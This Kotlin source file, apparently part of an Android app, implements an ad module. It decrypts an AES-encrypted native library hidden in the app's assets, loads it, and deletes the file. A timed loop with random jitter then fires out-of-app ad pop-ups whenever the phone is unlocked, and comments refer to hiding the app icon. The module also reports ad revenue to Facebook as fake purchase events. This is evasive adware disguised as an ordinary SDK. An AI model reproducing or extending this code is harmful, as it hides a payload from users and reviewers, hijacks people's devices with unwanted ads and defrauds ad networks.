package ad

import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import bef.aligeit.fcthing
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.hightway.tell.peek.Core
import com.hightway.tell.peek.dak.AppLifecycelListener
import com.hightway.tell.peek.dak.Constant
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false //是否显示广告
    private var lastSAdTime = 0L //上一次显示广告的时间

    @JvmStatic
    val mAdC: AdCenter = AdCenter()

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var mInstallWait = 40000 // 安装时间
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限

    private var numHour = Core.getInt("ad_s_h_n")
    private var numDay = Core.getInt("ad_s_d_n")
    private var isCurDay = Core.getStr("ad_lcd")
    private var numJumps = Core.getInt("ac_njp")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var fileName = ""// 文件开关名

    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var maxShowTime = 10000L // 最大显示时间
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("ac_njp", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
        mAdC.loadAd()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Core.pE("advertise_limit")
    }

    private fun sC() {
        Core.saveInt("ad_s_h_n", numHour)
        Core.saveInt("ad_s_d_n", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("ad_lht")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("ad_lht", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("ad_lcd", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun a2() {
        refreshAdmin()
        mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
        File("${mContext.dataDir}/$fileName").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString(Constant.K_SO)
        val listStr = js.optString(Constant.K_W).split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        fileName = listStr[3]
        val oneID = js.optString(Constant.K_ID_L).split("-")[0]
        val twoID = js.optString(Constant.K_ID_L).split("-")[1]
        mAdC.setAdId(oneID, twoID)// 广告id
        val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        mInstallWait = lt[2].toInt() * 1000
        nHourShowMax = lt[3].toInt()
        nDayShowMax = lt[4].toInt()
        nTryMax = lt[5].toInt()
        timeDS = lt[6].toLong()
        timeDE = lt[7].toLong()
        maxShowTime = lt[8].toLong() * 1000
        checkTimeRandom = lt[9].toInt() * 1000
    }

    private var lastS = ""
    private fun refreshAdmin() {
        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
        val s = "" // 获取admin外面的配置通过mmkv
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun t() {
        val is64i = is64a()
        mMainScope.launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loadSFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
            }
            if (i.not()) {
                Core.pE("ss_l_f", "$is64i")
                return@launch
            }
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            fcthing.a0(tagL, 1.0f)
            delay(1200)
            while (true) {
                // 刷新配置
                refreshAdmin()
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                cAction(t)
                delay(t)
                if (numJumps > nTryMax) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }
    }

    private fun loadSFile(assetsName: String): Boolean {
        val aIp = mContext.assets.open(assetsName)
        val fSN = "And_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            decrypt(aIp, File(file.absolutePath, fSN))
            val file2 = File(file.absolutePath, fSN)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (_: Exception) {
        }
        return false
    }

    private fun loadRawFile(assetsName: String): Boolean {
        val resourceId: Int =
            mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
        val aIp = mContext.resources.openRawResource(resourceId)
        val fSN = "A_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            decrypt(aIp, File(file.absolutePath, fSN))
            val file2 = File(file.absolutePath, fSN)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (_: Exception) {
        }
        return false
    }


    // 解密
    private fun decrypt(inputFile: InputStream, outputFile: File) {
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }


    // 定时逻辑
    private fun cAction(time: Long) {
        // 无网络不触发后续逻辑
        if (isNetworkAvailable().not()) return
        Core.pE("ad_session", time.toString())
        if (l().not()) return
        Core.pE("ad_light")
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        mAdC.loadAd()
        if (System.currentTimeMillis() - Core.insAppTime < mInstallWait) {
            Core.pE("ad_pass", "1t")
            return
        }
        if (System.currentTimeMillis() - lastSAdTime < tPer) {
            Core.pE("ad_pass", "2t")
            return
        }
        if (isSAd && System.currentTimeMillis() - lastSAdTime < maxShowTime) {
            Core.pE("ad_pass", "s")
            return
        }
        if (mAdC.isReady().not()) {// 无广告不外弹透明页面
            Core.pE("ad_pass", "n_ready")
            return
        }
        Core.pE("ad_pass", "N")
        isCanFinish = true
        CoroutineScope(Dispatchers.Main).launch {
            delay(finishAc())
            if (isSAd) {
                delay(800)
            }
            sNumJump(++numJumps)
            Core.pE("ad_start")
            fcthing.a0(tagO, 2.0f)
        }
    }

    private fun l(context: Context = mContext): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent(Constant.FIRE_NAME, b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Core.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    private var isCanFinish = false

    @JvmStatic
    fun finishAc(): Long {
        if (l().not()) return 0
        if (isCanFinish.not()) return 0
        // todo 获取外面的activity
        val l = Core.c0()
        if (l.isNotEmpty()) {
            ArrayList(l).forEach {
                it.finishAndRemoveTask()
            }
            return 900
        }
        return 0
    }
}